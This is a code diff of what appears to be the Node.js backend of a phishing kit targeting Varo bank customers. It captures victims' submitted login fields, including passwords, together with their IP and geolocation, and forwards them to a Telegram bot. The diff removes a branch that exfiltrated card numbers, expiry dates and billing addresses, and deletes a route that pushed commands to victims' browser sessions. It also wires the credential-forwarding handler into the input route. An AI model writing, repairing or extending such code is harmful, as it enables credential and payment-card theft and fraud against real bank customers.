@@ -69,7 +69,7 @@ let stats = '';
 let clients = {};
 let adminClient = null;
 let currPage = "";
-
+let message = '';
 function resetVisits(){
     visitors = 0;
 }
@@ -190,9 +190,6 @@ function getClientIp(req) {
     return req.connection.remoteAddress || req.socket.remoteAddress || null;
 }
 
-const handleRequest = async (req, res) => {
-    let message = '';
-    const ipAddress = getClientIp(req);
 
     const sendAPIRequest = async (ipAddress) => {
         try {
@@ -203,8 +200,13 @@ const handleRequest = async (req, res) => {
             return null;
         }
     };
-
+    
+    
+    
+async function handleRequest(req, res) {
+    const ipAddress = getClientIp(req);
     const ipAddressInformation = await sendAPIRequest(ipAddress);
+
     if (!ipAddressInformation) {
         return res.status(500).send('Error retrieving IP information');
     }
@@ -215,8 +217,8 @@ const handleRequest = async (req, res) => {
     const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
     console.log(lowerCaseMyObjects);
-    
-    if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
+
+    if (lowerCaseMyObjects.includes('password')) {
         message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
             `👤 LOGIN \n\n`;
 
@@ -244,31 +246,12 @@ const handleRequest = async (req, res) => {
         const sendMessage = sendMessageFor(botToken, chatId);
         sendMessage(message);
 
+        res.send('Message sent');
         return;
     }
 
-    if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
-        message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
-            `👤 CARD INFO \n\n`;
-
-        for (const key of myObjects) {
-            if (key.toLowerCase() !== 'visitor') {
-                console.log(`${key}: ${req.body[key]}`);
-                message += `${key}: ${req.body[key]}\n`;
-            }
-        }
-
-        message += `🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddress}\n` +
-            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-        const sendMessage = sendMessageFor(botToken, chatId);
-        sendMessage(message);
-
-        return;
-    }
-};
+    res.send('No sensitive data found');
+}
 
 
 
@@ -296,13 +279,35 @@ app.post('/heartbeat', (req, res) => {
 });
 
 
+const MAX_RETRIES = 6;
+
+
+async function retryConnection(clientId, retries = MAX_RETRIES) {
+    while (retries > 0) {
+        try {
+            // Attempt to reconnect here. This could be a ping, an HTTP request, etc.
+            console.log(`Attempting to reconnect to client ${clientId}... (${MAX_RETRIES - retries + 1}/${MAX_RETRIES})`);
+            // If reconnect attempt is successful:
+            return true; 
+        } catch (error) {
+            console.log(`Reconnection attempt ${MAX_RETRIES - retries + 1} failed for client ${clientId}`);
+        }
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second before retrying
+        retries--;
+    }
+    console.log(`Failed to reconnect to client ${clientId} after ${MAX_RETRIES} attempts.`);
+    return false;
+}
+
+
+
 app.get('/events', (req, res) => {
     const clientId = req.query.clientId;
     const isAdmin = req.query.admin === 'true';
     const clientIp = getClientIp(req);
     
     if (currPage === undefined || currPage === null || currPage === "" || currPage === "Disconnected") {
-        currPage = req.query.currPage; // Provide a default value if currPage is undefined, null, or an empty string
+        currPage = req.query.currPage || "defaultPage"; // Provide a default value if currPage is undefined, null, or an empty string
     }
 
     console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);
@@ -323,12 +328,14 @@ app.get('/events', (req, res) => {
             console.log('Admin client connected');
         }
 
-        
-        req.on('close', () => {
+        req.on('close', async () => {
             if (clientId) {
                 delete clients[clientId];
-                removeClientFromDatabase(clientId);
                 console.log(`Client ${clientId} disconnected`);
+                const reconnected = await retryConnection(clientId);
+                if (!reconnected) {
+                    console.log(`Unable to re-establish connection with client ${clientId}`);
+                }
             }
             if (isAdmin) {
                 adminClient = null;
@@ -343,36 +350,12 @@ app.get('/events', (req, res) => {
     }
 });
 
-app.post('/send-command', (req, res) => {
-    const { clientId, command } = req.body;
-    const client = clients[clientId];
-    if (client) {
-        client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
-    }
-    res.sendStatus(200);
-});
-
-app.post('/delete-client', (req, res) => {
-    const { clientId } = req.body;
-    if (clientId) {
-        // Remove the client from memory and database
-        if (clients[clientId]) {
-            clients[clientId].end(); // End the SSE connection
-            delete clients[clientId];
-        }
-        removeClientFromDatabase(clientId);
-        broadcastAdminPanel(currPage, stats);
-        res.sendStatus(200);
-    } else {
-        res.status(400).send('Missing clientId');
-    }
-});
-
 app.post('/input', async (req, res) => { // Mark the route handler as async
     const { clientId, currPage, inputs } = req.body;
 
     console.log('Received /input request:', req.body);
-
+	await handleRequest(req, res);
+    
     if (!clientId || typeof inputs !== 'object') {
         return res.status(400).send('Missing clientId or inputs object');
     }
